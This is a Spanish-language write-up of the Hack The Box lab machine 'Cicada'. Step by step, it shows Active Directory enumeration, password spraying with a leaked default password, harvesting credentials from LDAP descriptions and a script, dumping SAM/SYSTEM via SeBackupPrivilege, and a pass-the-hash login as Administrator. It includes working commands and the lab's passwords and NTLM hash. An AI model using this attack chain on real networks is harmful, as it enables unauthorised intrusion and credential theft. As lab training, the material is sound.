---
hidden: true
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Cicada

<figure><img src="../../../../../.gitbook/assets/Cicada.png" alt="" width="563"><figcaption></figcaption></figure>

## Reconnaissance

Comenzaremos a realizar un escaneo de todos los puertos abiertos de la máquina víctima. Entre los puertos que hemos encontrado interesantes se encuentran:

* 88 --> Kerberos
* 389 --> ldap
* 445 --> SMB
* 5985 --> Wsman (WinRM)

{% code overflow="wrap" %}
```bash
map -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.35 -oG allPorts
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/572_vmware_TJyWPJfE3z.png" alt="" width="563"><figcaption></figcaption></figure>

Procederemos a editar nuestro archivo **/etc/hosts** para hacer referencia al dominio a través de la dirección IP de la máquina.

<figure><img src="../../../../../.gitbook/assets/imagen (116).png" alt=""><figcaption></figcaption></figure>

## Users Enumeration

### Kerberos User Enumeration - Kerbrute

Procederemos a enumrar usuarios ya que hemos comprobado que el puerto de Kerberos está abierto a través de la herramienta **Kerbrute**, pasándole un diccionario para enumerar usuarios. Entre ellos nos encuentra el usuario "_guest_" y el usuario "_Administrator_".

{% code overflow="wrap" %}
```bash
kerbrute userenum --dc 10.10.11.35 -d cicada.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/578_vmware_ttQBoN1Nnv.png" alt="" width="563"><figcaption></figcaption></figure>

## SMB Enumeration

Probaremos con **netexec** a acceder al SMB con el usuario enumerado "_guest_" sin indicarle contraseña, comprobamos que podemos acceder sin contraseña.

```bash
netexec smb 10.10.11.35 -u guest -p ""
```

<figure><img src="../../../../../.gitbook/assets/imagen (120).png" alt=""><figcaption></figcaption></figure>

Probaremos de listar los recursos que se encuentran en el SMB.

```bash
smbclient -L 10.10.11.35 -U cicada.htb\guest
```

<figure><img src="../../../../../.gitbook/assets/583_vmware_uIuRl9wqzS.png" alt=""><figcaption></figcaption></figure>

Accederemos al recurso compartido "HR" que hemos encontrado con el usuario _guest_. Comprobaremos si el recurso dispone de algún archivo. Procederemos a descargar el archivo que hemos encontrado.

```bash
smbclient //10.10.11.35/HR -U cicada.htb\guest
ls
get "Notice from HR.txt"
quit
```

<figure><img src="../../../../../.gitbook/assets/imagen (121).png" alt=""><figcaption></figcaption></figure>

Comprobaremos el contenido del archivo y descubriremos que RRHH envió una noticia a los usuarios indicando la contraseña por defecto que dispondrían los usuarios.

```bash
catnp "Notice from HR.txt"
```

<figure><img src="../../../../../.gitbook/assets/imagen (122).png" alt=""><figcaption></figcaption></figure>

## Users Enumration

### RID Brute Enumeration&#x20;

Probaremos de realizar un ataque de "RID Brute" para enumera usuarios a través del RID en SMB. Entre ellos encontramos usuarios con un RID + de 1000, lo que indica que se trata de usuarios creados manualmente.

```bash
crackmapexec smb 10.10.11.35 -u cicada.htb\guest -p "" --rid-brute
```

<figure><img src="../../../../../.gitbook/assets/imagen (123).png" alt=""><figcaption></figcaption></figure>

En un archivo .txt nos guardaremos los usuarios que nos sirvan, que tengan un RID mayor a 1000 y los 2 que hemos enumerado con **Kerbrute**.

```bash
catnp users.txt
```

<figure><img src="../../../../../.gitbook/assets/imagen (126).png" alt=""><figcaption></figcaption></figure>

Procederemos a utilizar **netexec** para intentar comprobar a través del archivo _users.txt_ que hemos generado indicándole la contraseña que hemos encontrado, para comprobar si dicha contraseña es válida para un usuario. Nos encontramos que la contraseña es válida para el usuario _michael.wrightson_

```bash
netexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

<figure><img src="../../../../../.gitbook/assets/588_vmware_WkvZOxJVH4.png" alt=""><figcaption></figcaption></figure>

### LdapDomainDump

Con **ldapdomaindump** dumpearemos toda la información del LDAP a través del usuario y contraseña que hemos encontrado. Nos generará los resultados en distintos formatos.

{% code overflow="wrap" %}
```bash
ldapdomaindump -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' 10.10.11.35 -o dump
```
{% endcode %}

<figure><img src="../../../../../.gitbook/assets/imagen (128).png" alt=""><figcaption></figcaption></figure>

Si accedemos al archivo de "_domain\_users.html_" comprobaremos que hemos encontrado los usuarios que hay en LDAP y en el apartado de "Description" del usuario "daniel.orelious" se encuentra un texto indicando su respectiva contraseña.

<figure><img src="../../../../../.gitbook/assets/imagen (129).png" alt=""><figcaption></figcaption></figure>

## SMB Enumeration

Con **crackmapexec** probaremos de comprobar si el usuario que hemos encontrado "david.orelious" dispone de acceso algún recurso compartido de SMB. En este caso, comprobamos que disponemos de acceso al recurso "DEV" que parece ser algún recurso de desarrollador o algo parecido.

```bash
crackmapexec smb 10.10.11.35 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

<figure><img src="../../../../../.gitbook/assets/594_vmware_8gsC7Zmgjo.png" alt=""><figcaption></figcaption></figure>

Probaremos de acceder con **smbclient** con las credenciales encontradas, comprobaremos que en el recurso hay un script .ps1 el cual procederemos a descargar en nuestro equipo local.

```bash
smbclient //10.10.11.35/DEV -U cicada.htb/david.orelious
ls
get Backup_script.ps1
quit
```

<figure><img src="../../../../../.gitbook/assets/595_vmware_Ql5oYY6L0T.png" alt=""><figcaption></figcaption></figure>

Procederemos a comprobar el contenido del script .ps1 encontrado, y nos damos cuenta que para el usuario "_emily.oscars_" se encuentra su contraseña en texto plano.

```bash
catnp Backup_script.ps1
```

<figure><img src="../../../../../.gitbook/assets/imagen (130).png" alt=""><figcaption></figcaption></figure>

Procederemos a comprobar con estas nuevas credenciales el SMB y nos damos cuenta que tenemos permisos para acceder a "ADMIN$" y "C$", lo cual parece indicar que tenemos privilegios de Administración.

```bash
crackmapexec smb 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' --shares
```

<figure><img src="../../../../../.gitbook/assets/imagen (131).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

En este punto, probaremos de intentar acceder con este nuevo usuario al WinRM que hemos encontrado expuesto (Puerto 5985) a través de la herramienta de **evil-winrm**. Comprobaremos que hemos podido acceder correctamente y comprobaremos la _flag_ del usuario.

```bash
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

<figure><img src="../../../../../.gitbook/assets/598_vmware_KZ5pWz1oii.png" alt=""><figcaption></figcaption></figure>

### SeBackupPrivilege

Una vez con acceso a la máquina, deberemos de encontrar algún vector para poder escalar privilegios. Para ello lo primero será comprobar que privilegios dispone el usuario con el que estamos. Nos damos cuenta que tenemos el privilegio de "[_**SeBackupPrivilege**_](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/?source=post_page-----f29a7a6bd355--------------------------------)", lo cual nos permite crear copias de seguridad en el equipo.

Por lo tanto, podemos hacernos una copia del archivo SAM y SYSTEM y así luego poder extaer los hashes de los usuarios del sistema.

```bash
whoami /priv
reg save hklm\sam c:\temporal\sam
reg save hklm\system c:\temporal\system
```

<figure><img src="../../../../../.gitbook/assets/imagen (132).png" alt="" width="450"><figcaption></figcaption></figure>

Procederemos a descargarnos los 2 ficheros a nuestro equipo local y comprobar que los disponemos.

```bash
download SAM
download SYSTEM
```

<figure><img src="../../../../../.gitbook/assets/imagen (133).png" alt="" width="441"><figcaption></figcaption></figure>

Con la herramienta de **pypykatz** procederemos a extraer los hashes NTLM de la SAM.

```bash
pypykatz registry --sam SAM SYSTEM 2>/dev/null
```

<figure><img src="../../../../../.gitbook/assets/imagen (134).png" alt="" width="563"><figcaption></figcaption></figure>

Procederemos de conectarnos al WinRM que encontramos expuesto con **evil-winrm** intentando acceder con el usuario "Administrator" y con su respectivo hash NTLM. Comprobaremos que accedemos sin problemas y encontraremos la _flag_ del root.

```bash
evil-winrm -i 10.10.11.35 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'
```

<figure><img src="../../../../../.gitbook/assets/imagen (135).png" alt=""><figcaption></figcaption></figure>
